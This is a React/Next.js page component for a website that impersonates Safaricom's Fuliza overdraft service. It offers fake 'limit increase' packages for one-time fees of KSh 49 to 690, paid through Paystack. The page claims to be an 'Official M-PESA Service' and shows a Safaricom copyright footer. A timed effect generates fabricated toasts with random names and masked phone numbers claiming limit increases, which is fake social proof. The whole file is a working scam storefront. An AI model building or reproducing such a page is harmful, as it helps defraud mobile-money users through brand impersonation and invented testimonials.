'use client'

import { useState, useEffect } from 'react'
import PaystackPayment from './components/PaystackPayment'

export default function Home() {
  // Packages (12)
  const packages = [
    { limit: '5,000', fee: 49 }, { limit: '7,500', fee: 100 }, { limit: '10,000', fee: 140 },
    { limit: '12,500', fee: 160 }, { limit: '16,000', fee: 200 }, { limit: '20,000', fee: 260 },
    { limit: '24,500', fee: 310 }, { limit: '29,500', fee: 350 }, { limit: '33,000', fee: 420 },
    { limit: '38,500', fee: 490 }, { limit: '43,000', fee: 560 }, { limit: '50,000', fee: 690 }
  ]

  // Toast state
  const [toastMessage, setToastMessage] = useState('')
  
  // Payment modal state
  const [selectedPackage, setSelectedPackage] = useState(null)
  const [showPaymentModal, setShowPaymentModal] = useState(false)
  const [paymentError, setPaymentError] = useState('')

  // Scroll to packages
  const scrollToPackages = () => {
    document.getElementById('packages')?.scrollIntoView({ behavior: 'smooth' })
  }

  // Handle package selection
  const handleSelectPackage = (pkg) => {
    setSelectedPackage(pkg)
    setShowPaymentModal(true)
    setPaymentError('')
  }

  // Handle payment success
  const handlePaymentSuccess = (data) => {
    setShowPaymentModal(false)
    setSelectedPackage(null)
    setToastMessage('Payment initiated successfully! Redirecting to Paystack...')
  }

  // Handle payment error
  const handlePaymentError = (error) => {
    setPaymentError(error)
  }

  // Handle payment cancel
  const handlePaymentCancel = () => {
    setShowPaymentModal(false)
    setSelectedPackage(null)
    setPaymentError('')
  }

  // Live toasts effect
  useEffect(() => {
    const names = ['John', 'Mary', 'Peter', 'Anne', 'James', 'Lucy', 'David', 'Sarah']
    const prefixes = ['070', '071', '072', '074', '075', '079', '011']
    
    const interval = setInterval(() => {
      const name = names[Math.floor(Math.random() * names.length)]
      const prefix = prefixes[Math.floor(Math.random() * prefixes.length)]
      const suffix = Math.floor(100 + Math.random() * 899)
      setToastMessage(`${name} ${prefix}xxx${suffix} increased to Ksh 25,000`)
    }, 7000)

    return () => clearInterval(interval)
  }, [])

  return (
    <>
      {/* Navigation */}
      <nav className="navbar">
        <div className="navbar-container">
          <a href="#" className="navbar-brand">
            <div className="navbar-logo">S</div>
            <div>
              <div className="navbar-brand-text">Safaricom</div>
              <div className="navbar-brand-sub">Fuliza</div>
            </div>
          </a>
          <div className="navbar-menu">
            <a href="#packages" className="navbar-link">Packages</a>
            <a href="#" className="navbar-link">Help</a>
            <a href="#" className="navbar-cta">Login</a>
          </div>
        </div>
      </nav>

      {/* Toast notification */}
      {toastMessage && (
        <div className="toast-container">
          <div className="toast">
            <div className="toast-icon">✓</div>
            <div className="toast-content">
              <strong>{toastMessage}</strong><br />
              Just now
            </div>
          </div>
        </div>
      )}

      {/* Hero Section */}
      <section className="hero-section">
        <div className="hero-content">
          <div className="hero-badge">
            <span className="hero-badge-dot"></span>
            Official M-PESA Service
          </div>
          <h1 className="hero-title">
            Increase your <span className="hero-title-accent">Fuliza Limit</span>
          </h1>
          <p className="hero-description">
            Get instant access to more funds with a one-time fee. 
            Your Fuliza limit will be increased within minutes.
          </p>
          <a href="#packages" className="hero-cta" onClick={scrollToPackages}>
            Increase My Limit
          </a>
          <div className="hero-trust">
            <span className="hero-trust-item">✓ Secure SSL</span>
            <span className="hero-trust-item">⚡ Instant</span>
            <span className="hero-trust-item">🔒 M-PESA Protected</span>
          </div>
        </div>
      </section>

      {/* Main Content */}
      <main className="main-container">
        {/* Packages Section */}
        <section id="packages">
          <div className="section-header">
            <h2 className="section-title">Select Your Fuliza Package</h2>
            <p className="section-subtitle">Choose the limit that works for you</p>
          </div>
          
          <div className="packages-grid">
            {packages.map((pkg, idx) => (
              <div className="package-card" key={idx}>
                <div className="package-card-header">
                  <span className="package-name">FULIZA {pkg.limit}</span>
                  <span className="package-badge">Available</span>
                </div>
                <div className="package-amount">KSh {pkg.limit}</div>
                <div className="package-fee">
                  <span className="package-fee-label">One-time fee</span>
                  <span className="package-fee-amount">KSh {pkg.fee}</span>
                </div>
                <button 
                  className="package-button"
                  onClick={() => handleSelectPackage(pkg)}
                >
                  Get Now
                </button>
              </div>
            ))}
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-content">
          <div className="footer-logo">Safaricom PLC</div>
          <div className="footer-text">
            © 2026 Safaricom Limited · Fuliza Service
          </div>
        </div>
      </footer>

      {/* Payment Modal */}
      {showPaymentModal && selectedPackage && (
        <PaystackPayment
          amount={selectedPackage.fee}
          email="user@example.com"
          phone="0700000000"
          name="User"
          packageLimit={selectedPackage.limit}
          onSuccess={handlePaymentSuccess}
          onError={handlePaymentError}
          onClose={handlePaymentCancel}
        />
      )}

      {/* Payment Error Toast */}
      {paymentError && (
        <div className="toast-container">
          <div className="toast error">
            <div className="toast-icon">❌</div>
            <div className="toast-content">
              <strong>{paymentError}</strong><br />
              Please try again
            </div>
          </div>
        </div>
      )}
    </>
  )
}
